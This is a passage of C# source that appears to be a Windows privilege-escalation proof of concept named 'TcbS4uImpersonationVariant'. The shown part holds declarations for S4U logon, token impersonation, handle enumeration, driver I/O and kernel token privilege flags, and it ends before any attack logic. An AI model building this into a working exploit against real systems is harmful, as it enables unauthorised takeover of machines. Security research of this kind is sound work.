using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Security.Principal;

namespace TcbS4uImpersonationVariant
{
    using NTSTATUS = Int32;

    class TcbS4uImpersonationVariant
    {
        // Windows Definition
        // Windows Enum
        enum COMPUTER_NAME_FORMAT
        {
            ComputerNameNetBIOS,
            ComputerNameDnsHostname,
            ComputerNameDnsDomain,
            ComputerNameDnsFullyQualified,
            ComputerNamePhysicalNetBIOS,
            ComputerNamePhysicalDnsHostname,
            ComputerNamePhysicalDnsDomain,
            ComputerNamePhysicalDnsFullyQualified,
            ComputerNameMax
        }

        [Flags]
        enum FormatMessageFlags : uint
        {
            FORMAT_MESSAGE_ALLOCATE_BUFFER = 0x00000100,
            FORMAT_MESSAGE_IGNORE_INSERTS = 0x00000200,
            FORMAT_MESSAGE_FROM_STRING = 0x00000400,
            FORMAT_MESSAGE_FROM_HMODULE = 0x00000800,
            FORMAT_MESSAGE_FROM_SYSTEM = 0x00001000,
            FORMAT_MESSAGE_ARGUMENT_ARRAY = 0x00002000
        }

        enum MSV1_0_LOGON_SUBMIT_TYPE
        {
            MsV1_0InteractiveLogon = 2,
            MsV1_0Lm20Logon,
            MsV1_0NetworkLogon,
            MsV1_0SubAuthLogon,
            MsV1_0WorkstationUnlockLogon = 7,
            MsV1_0S4ULogon = 12,
            MsV1_0VirtualLogon = 82,
            MsV1_0NoElevationLogon = 83,
            MsV1_0LuidLogon = 84
        }

        [Flags]
        enum ProcessAccessFlags : uint
        {
            PROCESS_ALL_ACCESS = 0x001F0FFF,
            Terminate = 0x00000001,
            PROCESS_CREATE_THREAD = 0x00000002,
            PROCESS_VM_OPERATION = 0x00000008,
            PROCESS_VM_READ = 0x00000010,
            PROCESS_VM_WRITE = 0x00000020,
            PROCESS_DUP_HANDLE = 0x00000040,
            PROCESS_CREATE_PROCESS = 0x000000080,
            PROCESS_SET_QUOTA = 0x00000100,
            PROCESS_SET_INFORMATION = 0x00000200,
            PROCESS_QUERY_INFORMATION = 0x00000400,
            PROCESS_QUERY_LIMITED_INFORMATION = 0x00001000,
            SYNCHRONIZE = 0x00100000,
            MAXIMUM_ALLOWED = 0x02000000
        }

        enum SECURITY_IMPERSONATION_LEVEL
        {
            SecurityAnonymous,
            SecurityIdentification,
            SecurityImpersonation,
            SecurityDelegation
        }

        enum SECURITY_LOGON_TYPE
        {
            UndefinedLogonType = 0,
            Interactive = 2,
            Network,
            Batch,
            Service,
            Proxy,
            Unlock,
            NetworkCleartext,
            NewCredentials,
            RemoteInteractive,
            CachedInteractive,
            CachedRemoteInteractive,
            CachedUnlock
        }

        [Flags]
        enum SE_GROUP_ATTRIBUTES : uint
        {
            MANDATORY = 0x00000001,
            ENABLED_BY_DEFAULT = 0x00000002,
            ENABLED = 0x00000004,
            OWNER = 0x00000008,
            USE_FOR_DENY_ONLY = 0x00000010,
            INTEGRITY = 0x00000020,
            INTEGRITY_ENABLED = 0x00000040,
            RESOURCE = 0x20000000,
            LOGON_ID = 0xC0000000
        }

        enum SID_NAME_USE
        {
            SidTypeUser = 1,
            SidTypeGroup,
            SidTypeDomain,
            SidTypeAlias,
            SidTypeWellKnownGroup,
            SidTypeDeletedAccount,
            SidTypeInvalid,
            SidTypeUnknown,
            SidTypeComputer,
            SidTypeLabel,
            SidTypeLogonSession
        }

        enum SYSTEM_INFORMATION_CLASS
        {
            SystemBasicInformation = 0x00,
            SystemProcessorInformation = 0x01,
            SystemPerformanceInformation = 0x02,
            SystemTimeOfDayInformation = 0x03,
            SystemPathInformation = 0x04,
            SystemProcessInformation = 0x05,
            SystemCallCountInformation = 0x06,
            SystemDeviceInformation = 0x07,
            SystemProcessorPerformanceInformation = 0x08,
            SystemFlagsInformation = 0x09,
            SystemCallTimeInformation = 0x0A,
            SystemModuleInformation = 0x0B,
            SystemLocksInformation = 0x0C,
            SystemStackTraceInformation = 0x0D,
            SystemPagedPoolInformation = 0x0E,
            SystemNonPagedPoolInformation = 0x0F,
            SystemHandleInformation = 0x10,
            SystemObjectInformation = 0x11,
            SystemPageFileInformation = 0x12,
            SystemVdmInstemulInformation = 0x13,
            SystemVdmBopInformation = 0x14,
            SystemFileCacheInformation = 0x15,
            SystemPoolTagInformation = 0x16,
            SystemInterruptInformation = 0x17,
            SystemDpcBehaviorInformation = 0x18,
            SystemFullMemoryInformation = 0x19,
            SystemLoadGdiDriverInformation = 0x1A,
            SystemUnloadGdiDriverInformation = 0x1B,
            SystemTimeAdjustmentInformation = 0x1C,
            SystemSummaryMemoryInformation = 0x1D,
            SystemMirrorMemoryInformation = 0x1E,
            SystemPerformanceTraceInformation = 0x1F,
            SystemObsolete0 = 0x20,
            SystemExceptionInformation = 0x21,
            SystemCrashDumpStateInformation = 0x22,
            SystemKernelDebuggerInformation = 0x23,
            SystemContextSwitchInformation = 0x24,
            SystemRegistryQuotaInformation = 0x25,
            SystemExtendServiceTableInformation = 0x26,
            SystemPrioritySeperation = 0x27,
            SystemVerifierAddDriverInformation = 0x28,
            SystemVerifierRemoveDriverInformation = 0x29,
            SystemProcessorIdleInformation = 0x2A,
            SystemLegacyDriverInformation = 0x2B,
            SystemCurrentTimeZoneInformation = 0x2C,
            SystemLookasideInformation = 0x2D,
            SystemTimeSlipNotification = 0x2E,
            SystemSessionCreate = 0x2F,
            SystemSessionDetach = 0x30,
            SystemSessionInformation = 0x31,
            SystemRangeStartInformation = 0x32,
            SystemVerifierInformation = 0x33,
            SystemVerifierThunkExtend = 0x34,
            SystemSessionProcessInformation = 0x35,
            SystemLoadGdiDriverInSystemSpace = 0x36,
            SystemNumaProcessorMap = 0x37,
            SystemPrefetcherInformation = 0x38,
            SystemExtendedProcessInformation = 0x39,
            SystemRecommendedSharedDataAlignment = 0x3A,
            SystemComPlusPackage = 0x3B,
            SystemNumaAvailableMemory = 0x3C,
            SystemProcessorPowerInformation = 0x3D,
            SystemEmulationBasicInformation = 0x3E,
            SystemEmulationProcessorInformation = 0x3F,
            SystemExtendedHandleInformation = 0x40,
            SystemLostDelayedWriteInformation = 0x41,
            SystemBigPoolInformation = 0x42,
            SystemSessionPoolTagInformation = 0x43,
            SystemSessionMappedViewInformation = 0x44,
            SystemHotpatchInformation = 0x45,
            SystemObjectSecurityMode = 0x46,
            SystemWatchdogTimerHandler = 0x47,
            SystemWatchdogTimerInformation = 0x48,
            SystemLogicalProcessorInformation = 0x49,
            SystemWow64SharedInformationObsolete = 0x4A,
            SystemRegisterFirmwareTableInformationHandler = 0x4B,
            SystemFirmwareTableInformation = 0x4C,
            SystemModuleInformationEx = 0x4D,
            SystemVerifierTriageInformation = 0x4E,
            SystemSuperfetchInformation = 0x4F,
            SystemMemoryListInformation = 0x50,
            SystemFileCacheInformationEx = 0x51,
            SystemThreadPriorityClientIdInformation = 0x52,
            SystemProcessorIdleCycleTimeInformation = 0x53,
            SystemVerifierCancellationInformation = 0x54,
            SystemProcessorPowerInformationEx = 0x55,
            SystemRefTraceInformation = 0x56,
            SystemSpecialPoolInformation = 0x57,
            SystemProcessIdInformation = 0x58,
            SystemErrorPortInformation = 0x59,
            SystemBootEnvironmentInformation = 0x5A,
            SystemHypervisorInformation = 0x5B,
            SystemVerifierInformationEx = 0x5C,
            SystemTimeZoneInformation = 0x5D,
            SystemImageFileExecutionOptionsInformation = 0x5E,
            SystemCoverageInformation = 0x5F,
            SystemPrefetchPatchInformation = 0x60,
            SystemVerifierFaultsInformation = 0x61,
            SystemSystemPartitionInformation = 0x62,
            SystemSystemDiskInformation = 0x63,
            SystemProcessorPerformanceDistribution = 0x64,
            SystemNumaProximityNodeInformation = 0x65,
            SystemDynamicTimeZoneInformation = 0x66,
            SystemCodeIntegrityInformation = 0x67,
            SystemProcessorMicrocodeUpdateInformation = 0x68,
            SystemProcessorBrandString = 0x69,
            SystemVirtualAddressInformation = 0x6A,
            SystemLogicalProcessorAndGroupInformation = 0x6B,
            SystemProcessorCycleTimeInformation = 0x6C,
            SystemStoreInformation = 0x6D,
            SystemRegistryAppendString = 0x6E,
            SystemAitSamplingValue = 0x6F,
            SystemVhdBootInformation = 0x70,
            SystemCpuQuotaInformation = 0x71,
            SystemNativeBasicInformation = 0x72,
            SystemErrorPortTimeouts = 0x73,
            SystemLowPriorityIoInformation = 0x74,
            SystemBootEntropyInformation = 0x75,
            SystemVerifierCountersInformation = 0x76,
            SystemPagedPoolInformationEx = 0x77,
            SystemSystemPtesInformationEx = 0x78,
            SystemNodeDistanceInformation = 0x79,
            SystemAcpiAuditInformation = 0x7A,
            SystemBasicPerformanceInformation = 0x7B,
            SystemQueryPerformanceCounterInformation = 0x7C,
            SystemSessionBigPoolInformation = 0x7D,
            SystemBootGraphicsInformation = 0x7E,
            SystemScrubPhysicalMemoryInformation = 0x7F,
            SystemBadPageInformation = 0x80,
            SystemProcessorProfileControlArea = 0x81,
            SystemCombinePhysicalMemoryInformation = 0x82,
            SystemEntropyInterruptTimingInformation = 0x83,
            SystemConsoleInformation = 0x84,
            SystemPlatformBinaryInformation = 0x85,
            SystemPolicyInformation = 0x86,
            SystemHypervisorProcessorCountInformation = 0x87,
            SystemDeviceDataInformation = 0x88,
            SystemDeviceDataEnumerationInformation = 0x89,
            SystemMemoryTopologyInformation = 0x8A,
            SystemMemoryChannelInformation = 0x8B,
            SystemBootLogoInformation = 0x8C,
            SystemProcessorPerformanceInformationEx = 0x8D,
            SystemCriticalProcessErrorLogInformation = 0x8E,
            SystemSecureBootPolicyInformation = 0x8F,
            SystemPageFileInformationEx = 0x90,
            SystemSecureBootInformation = 0x91,
            SystemEntropyInterruptTimingRawInformation = 0x92,
            SystemPortableWorkspaceEfiLauncherInformation = 0x93,
            SystemFullProcessInformation = 0x94,
            SystemKernelDebuggerInformationEx = 0x95,
            SystemBootMetadataInformation = 0x96,
            SystemSoftRebootInformation = 0x97,
            SystemElamCertificateInformation = 0x98,
            SystemOfflineDumpConfigInformation = 0x99,
            SystemProcessorFeaturesInformation = 0x9A,
            SystemRegistryReconciliationInformation = 0x9B,
            SystemEdidInformation = 0x9C,
            SystemManufacturingInformation = 0x9D,
            SystemEnergyEstimationConfigInformation = 0x9E,
            SystemHypervisorDetailInformation = 0x9F,
            SystemProcessorCycleStatsInformation = 0xA0,
            SystemVmGenerationCountInformation = 0xA1,
            SystemTrustedPlatformModuleInformation = 0xA2,
            SystemKernelDebuggerFlags = 0xA3,
            SystemCodeIntegrityPolicyInformation = 0xA4,
            SystemIsolatedUserModeInformation = 0xA5,
            SystemHardwareSecurityTestInterfaceResultsInformation = 0xA6,
            SystemSingleModuleInformation = 0xA7,
            SystemAllowedCpuSetsInformation = 0xA8,
            SystemDmaProtectionInformation = 0xA9,
            SystemInterruptCpuSetsInformation = 0xAA,
            SystemSecureBootPolicyFullInformation = 0xAB,
            SystemCodeIntegrityPolicyFullInformation = 0xAC,
            SystemAffinitizedInterruptProcessorInformation = 0xAD,
            SystemRootSiloInformation = 0xAE,
            SystemCpuSetInformation = 0xAF,
            SystemCpuSetTagInformation = 0xB0,
            SystemWin32WerStartCallout = 0xB1,
            SystemSecureKernelProfileInformation = 0xB2,
            SystemCodeIntegrityPlatformManifestInformation = 0xB3,
            SystemInterruptSteeringInformation = 0xB4,
            SystemSuppportedProcessorArchitectures = 0xB5,
            SystemMemoryUsageInformation = 0xB6,
            SystemCodeIntegrityCertificateInformation = 0xB7,
            SystemPhysicalMemoryInformation = 0xB8,
            SystemControlFlowTransition = 0xB9,
            SystemKernelDebuggingAllowed = 0xBA,
            SystemActivityModerationExeState = 0xBB,
            SystemActivityModerationUserSettings = 0xBC,
            SystemCodeIntegrityPoliciesFullInformation = 0xBD,
            SystemCodeIntegrityUnlockInformation = 0xBE,
            SystemIntegrityQuotaInformation = 0xBF,
            SystemFlushInformation = 0xC0,
            SystemProcessorIdleMaskInformation = 0xC1,
            SystemSecureDumpEncryptionInformation = 0xC2,
            SystemWriteConstraintInformation = 0xC3,
            SystemKernelVaShadowInformation = 0xC4,
            SystemHypervisorSharedPageInformation = 0xC5,
            SystemFirmwareBootPerformanceInformation = 0xC6,
            SystemCodeIntegrityVerificationInformation = 0xC7,
            SystemFirmwarePartitionInformation = 0xC8,
            SystemSpeculationControlInformation = 0xC9,
            SystemDmaGuardPolicyInformation = 0xCA,
            SystemEnclaveLaunchControlInformation = 0xCB,
            SystemWorkloadAllowedCpuSetsInformation = 0xCC,
            SystemCodeIntegrityUnlockModeInformation = 0xCD,
            SystemLeapSecondInformation = 0xCE,
            SystemFlags2Information = 0xCF,
            SystemSecurityModelInformation = 0xD0,
            SystemCodeIntegritySyntheticCacheInformation = 0xD1,
            MaxSystemInfoClass = 0xD2
        }

        [Flags]
        enum TokenAccessFlags : uint
        {
            TOKEN_ADJUST_DEFAULT = 0x0080,
            TOKEN_ADJUST_GROUPS = 0x0040,
            TOKEN_ADJUST_PRIVILEGES = 0x0020,
            TOKEN_ADJUST_SESSIONID = 0x0100,
            TOKEN_ASSIGN_PRIMARY = 0x0001,
            TOKEN_DUPLICATE = 0x0002,
            TOKEN_EXECUTE = 0x00020000,
            TOKEN_IMPERSONATE = 0x0004,
            TOKEN_QUERY = 0x0008,
            TOKEN_QUERY_SOURCE = 0x0010,
            TOKEN_READ = 0x00020008,
            TOKEN_WRITE = 0x000200E0,
            TOKEN_ALL_ACCESS = 0x000F01FF,
            MAXIMUM_ALLOWED = 0x02000000
        }

        enum TOKEN_INFORMATION_CLASS
        {
            TokenUser = 1,
            TokenGroups,
            TokenPrivileges,
            TokenOwner,
            TokenPrimaryGroup,
            TokenDefaultDacl,
            TokenSource,
            TokenType,
            TokenImpersonationLevel,
            TokenStatistics,
            TokenRestrictedSids,
            TokenSessionId,
            TokenGroupsAndPrivileges,
            TokenSessionReference,
            TokenSandBoxInert,
            TokenAuditPolicy,
            TokenOrigin,
            TokenElevationType,
            TokenLinkedToken,
            TokenElevation,
            TokenHasRestrictions,
            TokenAccessInformation,
            TokenVirtualizationAllowed,
            TokenVirtualizationEnabled,
            TokenIntegrityLevel,
            TokenUIAccess,
            TokenMandatoryPolicy,
            TokenLogonSid,
            MaxTokenInfoClass
        }

        [Flags]
        enum USER_FLAGS : uint
        {
            UF_SCRIPT = 0x00000001,
            UF_ACCOUNTDISABLE = 0x00000002,
            UF_HOMEDIR_REQUIRED = 0x00000008,
            UF_LOCKOUT = 0x00000010,
            UF_PASSWD_NOTREQD = 0x00000020,
            UF_PASSWD_CANT_CHANGE = 0x00000040,
            UF_ENCRYPTED_TEXT_PASSWORD_ALLOWED = 0x00000080,
            UF_TEMP_DUPLICATE_ACCOUNT = 0x00000100,
            UF_NORMAL_ACCOUNT = 0x00000200,
            UF_INTERDOMAIN_TRUST_ACCOUNT = 0x00000800,
            UF_WORKSTATION_TRUST_ACCOUNT = 0x00001000,
            UF_SERVER_TRUST_ACCOUNT = 0x00002000,
            UF_DONT_EXPIRE_PASSWD = 0x00010000,
            UF_MNS_LOGON_ACCOUNT = 0x00020000,
            UF_SMARTCARD_REQUIRED = 0x00040000,
            UF_TRUSTED_FOR_DELEGATION = 0x00080000,
            UF_NOT_DELEGATED = 0x00100000,
            UF_USE_DES_KEY_ONLY = 0x00200000,
            UF_DONT_REQUIRE_PREAUTH = 0x00400000,
            UF_PASSWORD_EXPIRED = 0x00800000,
            UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION = 0x01000000,
            UF_NO_AUTH_DATA_REQUIRED = 0x02000000,
            UF_PARTIAL_SECRETS_ACCOUNT = 0x04000000,
            UF_USE_AES_KEYS = 0x08000000
        }

        enum USER_INFO_FILTER
        {
            INTERDOMAIN_TRUST_ACCOUNT = 0x8,
            NORMAL_ACCOUNT = 0x2,
            PROXY_ACCOUNT = 0x4,
            SERVER_TRUST_ACCOUNT = 0x20,
            TEMP_DUPLICATE_ACCOUNT = 0x1,
            WORKSTATION_TRUST_ACCOUNT = 0x10
        }

        enum USER_PRIVS
        {
            GUEST,
            USER,
            ADMIN
        }

        // Windows Struct
        [StructLayout(LayoutKind.Sequential)]
        struct LSA_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            [MarshalAs(UnmanagedType.LPStr)]
            string Buffer;

            public LSA_STRING(string str)
            {
                Length = 0;
                MaximumLength = 0;
                Buffer = null;
                SetString(str);
            }

            public void SetString(string str)
            {
                if (str.Length > (ushort.MaxValue - 1))
                {
                    throw new ArgumentException("String too long for UnicodeString");
                }

                Length = (ushort)(str.Length);
                MaximumLength = (ushort)(str.Length + 1);
                Buffer = str;
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        struct LUID
        {
            public uint LowPart;
            public uint HighPart;

            public LUID(uint _lowPart, uint _highPart)
            {
                LowPart = _lowPart;
                HighPart = _highPart;
            }
        }


        class MSV1_0_S4U_LOGON : IDisposable
        {
            public IntPtr Buffer { get; } = IntPtr.Zero;
            public int Length { get; } = 0;

            private struct MSV1_0_S4U_LOGON_INNER
            {
                public MSV1_0_LOGON_SUBMIT_TYPE MessageType;
                public uint Flags;
                public UNICODE_STRING UserPrincipalName;
                public UNICODE_STRING DomainName;
            }

            public MSV1_0_S4U_LOGON(MSV1_0_LOGON_SUBMIT_TYPE type, uint flags, string upn, string domain)
            {
                int innerStructSize = Marshal.SizeOf(typeof(MSV1_0_S4U_LOGON_INNER));
                var pUpnBuffer = IntPtr.Zero;
                var pDomainBuffer = IntPtr.Zero;
                var innerStruct = new MSV1_0_S4U_LOGON_INNER
                {
                    MessageType = type,
                    Flags = flags
                };
                Length = innerStructSize;

                if (string.IsNullOrEmpty(upn))
                {
                    innerStruct.UserPrincipalName.Length = 0;
                    innerStruct.UserPrincipalName.MaximumLength = 0;
                }
                else
                {
                    innerStruct.UserPrincipalName.Length = (ushort)(upn.Length * 2);
                    innerStruct.UserPrincipalName.MaximumLength = (ushort)((upn.Length * 2) + 2);
                    Length += innerStruct.UserPrincipalName.MaximumLength;
                }

                if (string.IsNullOrEmpty(domain))
                {
                    innerStruct.DomainName.Length = 0;
                    innerStruct.DomainName.MaximumLength = 0;
                }
                else
                {
                    innerStruct.DomainName.Length = (ushort)(domain.Length * 2);
                    innerStruct.DomainName.MaximumLength = (ushort)((domain.Length * 2) + 2);
                    Length += innerStruct.DomainName.MaximumLength;
                }

                Buffer = Marshal.AllocHGlobal(Length);

                for (var offset = 0; offset < Length; offset++)
                    Marshal.WriteByte(Buffer, offset, 0);

                if (!string.IsNullOrEmpty(upn))
                {
                    if (Environment.Is64BitProcess)
                        pUpnBuffer = new IntPtr(Buffer.ToInt64() + innerStructSize);
                    else
                        pUpnBuffer = new IntPtr(Buffer.ToInt32() + innerStructSize);

                    innerStruct.UserPrincipalName.SetBuffer(pUpnBuffer);
                }

                if (!string.IsNullOrEmpty(domain))
                {
                    if (Environment.Is64BitProcess)
                        pDomainBuffer = new IntPtr(Buffer.ToInt64() + innerStructSize + innerStruct.UserPrincipalName.MaximumLength);
                    else
                        pDomainBuffer = new IntPtr(Buffer.ToInt32() + innerStructSize + innerStruct.UserPrincipalName.MaximumLength);

                    innerStruct.DomainName.SetBuffer(pDomainBuffer);
                }

                Marshal.StructureToPtr(innerStruct, Buffer, true);

                if (!string.IsNullOrEmpty(upn))
                    Marshal.Copy(Encoding.Unicode.GetBytes(upn), 0, pUpnBuffer, upn.Length * 2);

                if (!string.IsNullOrEmpty(domain))
                    Marshal.Copy(Encoding.Unicode.GetBytes(domain), 0, pDomainBuffer, domain.Length * 2);
            }

            public void Dispose()
            {
                if (Buffer != IntPtr.Zero)
                    Marshal.FreeHGlobal(Buffer);
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        struct QUOTA_LIMITS
        {
            public uint PagedPoolLimit;
            public uint NonPagedPoolLimit;
            public uint MinimumWorkingSetSize;
            public uint MaximumWorkingSetSize;
            public uint PagefileLimit;
            public long TimeLimit;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct SID_AND_ATTRIBUTES
        {
            public IntPtr Sid; // PSID
            public uint Attributes;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        struct SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX
        {
            public IntPtr Object;
            public IntPtr UniqueProcessId;
            public IntPtr HandleValue;
            public int GrantedAccess;
            public short CreatorBackTraceIndex;
            public short ObjectTypeIndex;
            public int HandleAttributes;
            public int Reserved;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_GROUPS
        {
            public int GroupCount;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
            public SID_AND_ATTRIBUTES[] Groups;

            public TOKEN_GROUPS(int privilegeCount)
            {
                GroupCount = privilegeCount;
                Groups = new SID_AND_ATTRIBUTES[1];
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_MANDATORY_LABEL
        {
            public SID_AND_ATTRIBUTES Label;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_SOURCE
        {

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public byte[] SourceName;
            public LUID SourceIdentifier;

            public TOKEN_SOURCE(string name)
            {
                SourceName = new byte[8];
                Encoding.GetEncoding(1252).GetBytes(name, 0, name.Length, SourceName, 0);
                if (!AllocateLocallyUniqueId(out SourceIdentifier))
                    throw new System.ComponentModel.Win32Exception();
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        struct UNICODE_STRING : IDisposable
        {
            public ushort Length;
            public ushort MaximumLength;
            private IntPtr buffer;

            public UNICODE_STRING(string s)
            {
                Length = (ushort)(s.Length * 2);
                MaximumLength = (ushort)(Length + 2);
                buffer = Marshal.StringToHGlobalUni(s);
            }

            public void Dispose()
            {
                Marshal.FreeHGlobal(buffer);
                buffer = IntPtr.Zero;
            }

            public void SetBuffer(IntPtr _buffer)
            {
                buffer = _buffer;
            }

            public override string ToString()
            {
                if ((Length == 0) || (buffer == IntPtr.Zero))
                    return null;
                else
                    return Marshal.PtrToStringUni(buffer, Length / 2);
            }
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct USER_INFO_1
        {
            public string usri1_name;
            public string usri1_password;
            public int usri1_password_age;
            public USER_PRIVS usri1_priv;
            public string usri1_home_dir;
            public string usri1_comment;
            public USER_FLAGS usri1_flags;
            public string usri1_script_path;
        }

        // Windows API
        /*
         * advapi32.dll
         */
        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool AllocateLocallyUniqueId(out LUID Luid);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool ConvertSidToStringSid(IntPtr pSid, out string strSid);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool ConvertStringSidToSid(string StringSid, out IntPtr pSid);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern int GetLengthSid(IntPtr pSid);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool LookupAccountSid(
            string lpSystemName,
            IntPtr Sid,
            StringBuilder Name,
            ref int cchName,
            StringBuilder ReferencedDomainName,
            ref int cchReferencedDomainName,
            out SID_NAME_USE peUse);

        [DllImport("advapi32.dll")]
        static extern int LsaClose(IntPtr PolicyHandle);

        [DllImport("advapi32")]
        static extern int LsaNtStatusToWinError(NTSTATUS NTSTATUS);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenProcessToken(
            IntPtr hProcess,
            TokenAccessFlags DesiredAccess,
            out IntPtr hToken);

        /*
         * kernel32.dll
         */
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr CreateFile(
            string lpFileName,
            FileAccess dwDesiredAccess,
            FileShare dwShareMode,
            IntPtr lpSecurityAttributes,
            FileMode dwCreationDisposition,
            FileAttributes dwFlagsAndAttributes,
            IntPtr hTemplateFile);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool DeviceIoControl(
            IntPtr hDevice,
            uint dwIoControlCode,
            IntPtr InBuffer,
            int nInBufferSize,
            IntPtr OutBuffer,
            int nOutBufferSize,
            IntPtr pBytesReturned,
            IntPtr lpOverlapped);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern int FormatMessage(
            FormatMessageFlags dwFlags,
            IntPtr lpSource,
            int dwMessageId,
            int dwLanguageId,
            StringBuilder lpBuffer,
            int nSize,
            IntPtr Arguments);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool GetComputerNameEx(
            COMPUTER_NAME_FORMAT NameType,
            StringBuilder lpBuffer,
            ref int nSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr LocalFree(IntPtr hMem);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(
            ProcessAccessFlags processAccess,
            bool bInheritHandle,
            int processId);

        [DllImport("kernel32.dll")]
        static extern void SetLastError(int dwErrCode);

        /*
         * netapi32.dll
         */
        [DllImport("netapi32.dll")]
        static extern int NetApiBufferFree(IntPtr Buffer);

        [DllImport("netapi32.dll", CharSet = CharSet.Unicode)]
        static extern int NetUserEnum(
            string servername,
            int level,
            USER_INFO_FILTER filter,
            out IntPtr bufptr,
            int prefmaxlen,
            out int entriesread,
            out int totalentries,
            IntPtr resume_handle);

        /*
         * ntdll.dll
         */
        [DllImport("ntdll.dll")]
        static extern NTSTATUS NtQueryInformationToken(
            IntPtr TokenHandle,
            TOKEN_INFORMATION_CLASS TokenInformationClass,
            IntPtr TokenInformation,
            uint TokenInformationLength,
            out uint ReturnLength);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern int NtQuerySystemInformation(
            SYSTEM_INFORMATION_CLASS SystemInformationClass,
            IntPtr SystemInformation,
            uint SystemInformationLength,
            out uint ReturnLength);

        [DllImport("ntdll.dll")]
        static extern NTSTATUS NtSetInformationToken(
            IntPtr TokenHandle,
            TOKEN_INFORMATION_CLASS TokenInformationClass,
            IntPtr TokenInformation,
            uint TokenInformationLength);

        /*
         * secur32.dll
         */
        [DllImport("secur32.dll", SetLastError = false)]
        static extern NTSTATUS LsaConnectUntrusted(out IntPtr LsaHandle);

        [DllImport("secur32.dll", SetLastError = false)]
        static extern NTSTATUS LsaFreeReturnBuffer(IntPtr buffer);

        [DllImport("secur32.dll")]
        static extern NTSTATUS LsaLogonUser(
            IntPtr LsaHandle,
            in LSA_STRING OriginName,
            SECURITY_LOGON_TYPE LogonType,
            uint AuthenticationPackage,
            IntPtr AuthenticationInformation,
            uint AuthenticationInformationLength,
            IntPtr /* in TOKEN_GROUPS */ LocalGroups,
            in TOKEN_SOURCE SourceContext,
            out IntPtr ProfileBuffer,
            out uint ProfileBufferLength,
            out LUID LogonId,
            IntPtr Token, // [out] PHANDLE
            out QUOTA_LIMITS Quotas,
            out NTSTATUS SubStatus);

        [DllImport("secur32.dll", SetLastError = true)]
        static extern NTSTATUS LsaLookupAuthenticationPackage(
            IntPtr LsaHandle,
            in LSA_STRING PackageName,
            out uint AuthenticationPackage);

        // Windows Consts
        const NTSTATUS STATUS_SUCCESS = 0;
        const int ERROR_SUCCESS = 0;
        const int ERROR_MORE_DATA = 0x000000EA;
        static readonly int STATUS_INFO_LENGTH_MISMATCH = Convert.ToInt32("0xC0000004", 16);
        static readonly NTSTATUS STATUS_BUFFER_TOO_SMALL = Convert.ToInt32("0xC0000023", 16);
        static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
        const string MSV1_0_PACKAGE_NAME = "MICROSOFT_AUTHENTICATION_PACKAGE_V1_0";
        const string NEGOSSP_NAME = "Negotiate";

        // User define Consts
        [Flags]
        enum SepTokenPrivilegesFlags : ulong
        {
            CREATE_TOKEN = 0x0000000000000004UL, // SeCreateTokenPrivilege
            ASSIGNPRIMARYTOKEN = 0x0000000000000008UL, // SeAssignPrimaryTokenPrivilege
            LOCK_MEMORY = 0x0000000000000010UL, // SeLockMemoryPrivilege
            INCREASE_QUOTA = 0x0000000000000020UL, // SeIncreaseQuotaPrivilege
            MACHINE_ACCOUNT = 0x0000000000000040UL, // SeMachineAccountPrivilege
            TCB = 0x0000000000000080UL, // SeTcbPrivilege
            SECURITY = 0x0000000000000100UL, // SeSecurityPrivilege
            TAKE_OWNERSHIP = 0x0000000000000200UL, // SeTakeOwnershipPrivilege
            LOAD_DRIVER = 0x0000000000000400UL, // SeLoadDriverPrivilege
            SYSTEM_PROFILE = 0x0000000000000800UL, // SeSystemProfilePrivilege
            SYSTEMTIME = 0x0000000000001000UL, // SeSystemtimePrivilege
            PROFILE_SINGLE_PROCESS = 0x0000000000002000UL, // SeProfileSingleProcessPrivilege
            INCREASE_BASE_PRIORITY = 0x0000000000004000UL, // SeIncreaseBasePriorityPrivilege
            CREATE_PAGEFILE = 0x0000000000008000UL, // SeCreatePagefilePrivilege
            CREATE_PERMANENT = 0x0000000000010000UL, // SeCreatePermanentPrivilege
            BACKUP = 0x0000000000020000UL, // SeBackupPrivilege
            RESTORE = 0x0000000000040000UL, // SeRestorePrivilege
            SHUTDOWN = 0x0000000000080000UL, // SeShutdownPrivilege
            DEBUG = 0x0000000000100000UL, // SeDebugPrivilege
            AUDIT = 0x0000000000200000UL, // SeAuditPrivilege
            SYSTEM_ENVIRONMENT = 0x0000000000400000UL, // SeSystemEnvironmentPrivilege
            CHANGE_NOTIFY = 0x0000000000800000UL, // SeChangeNotifyPrivilege
            REMOTE_SHUTDOWN = 0x0000000001000000UL, // SeRemoteShutdownPrivilege
